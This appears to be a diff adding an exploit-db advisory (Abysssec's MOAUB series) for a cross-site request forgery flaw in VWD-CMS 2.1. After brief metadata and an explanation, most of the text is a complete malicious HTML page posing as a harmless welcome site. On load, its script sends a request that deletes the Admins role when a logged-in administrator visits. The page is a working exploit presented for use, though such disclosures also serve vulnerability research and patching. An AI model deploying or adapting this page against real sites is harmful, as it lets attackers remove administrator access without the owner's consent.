@@ -1,0 +1,86 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ < 
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+
+ 
+ 
+  Title            :  VWD-CMS CSRF Vulnerability
+  Affected Version :  VWD-CMS version 2.1
+  Discovery        :  www.abysssec.com
+  Vendor	   :  http://www.vwd-cms.com/
+
+  Demo  	   :  http://server/templates/Emerald.aspx
+		      http://server/templates/balloonr.aspx
+
+  Download Links   :  http://vwdcms.codeplex.com/
+  
+  Admin Page       :  http://Example.com/login.aspx
+  
+http://www.exploit-db.com/moaub-20-vwd-cms-csrf-vulnerability/
+'''
+ 
+1)CSRF :
+===========================================================================================      
+  The VWD-CMS have CSRF Vulnerability in order to remove any Role especially Admins Role. 
+  With this Vulnerability you can navigate the admin to visit malicious site (when he is already logged in) 
+  to remove a role.
+
+ In this path a role could be removed::
+        http://Example.com/VwdCms/Members/RoleEdit.aspx?delete=yes&role=RoleName
+        (RoleName can be Admins or Members)
+  
+  here is HTML File with AJAX Code and with GET Method for this operation that is enough to Admin meet it.
+
+
+The Source of HTML Page (Malicious Site) 
+===========================================================================================     
+  
+
+<html>
+<head>
+<title >Wellcome to My Site!</title>
+Hello!
+...
+...
+...
+This page remove Admins Role in VWD-CMS. 
+
+<script>          
+        function RemoveRole() {            
+            try {
+                netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
+            } catch (e) {}
+
+            var http = false;
+            if (window.XMLHttpRequest) {
+                http = new XMLHttpRequest();
+            }
+            else if (window.ActiveXObject) {
+                http = new ActiveXObject("Microsoft.XMLHTTP");                
+            }
+
+            url = "http://server/VwdCms/Members/RoleEdit.aspx?delete=yes&role=Admins";
+            http.onreadystatechange = done;
+            http.open('GET', url, true);
+            http.send(null);
+        }
+        function done() {
+            if (http.readyState == 4 && http.status == 200) 
+            {               
+            }
+        }     
+</script>
+</head>
+<body onload ="RemoveRole();">
+</body>
+</html>
+
+
+
+===========================================================================================
+ 
